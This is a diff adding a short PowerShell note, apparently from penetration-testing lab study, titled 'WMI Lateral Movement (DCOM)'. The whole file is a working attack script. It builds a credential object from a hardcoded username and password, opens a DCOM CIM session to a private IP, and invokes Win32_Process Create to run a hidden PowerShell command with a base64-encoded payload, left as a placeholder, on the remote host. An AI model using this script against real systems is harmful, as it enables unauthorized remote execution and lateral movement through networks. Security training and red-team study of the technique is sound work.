@@ -1,0 +1,21 @@
+#ON WINDOWS MACHINE.
+
+WMI Lateral Movement (DCOM) — PowerShell
+
+# Step 1 — Set credentials
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+# Step 2 — Set DCOM as the protocol
+$Options = New-CimSessionOption -Protocol DCOM
+
+# Step 3 — Create the CimSession to target machine
+$Session = New-Cimsession -ComputerName 192.168.151.73 -Credential $credential -SessionOption $Options
+
+# Step 4 — Execute command on remote machine (base64 encoded payload)
+$Command = 'powershell -nop -w hidden -e <base64_encoded_payload>';
+
+# Step 5 — Invoke it via WMI
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
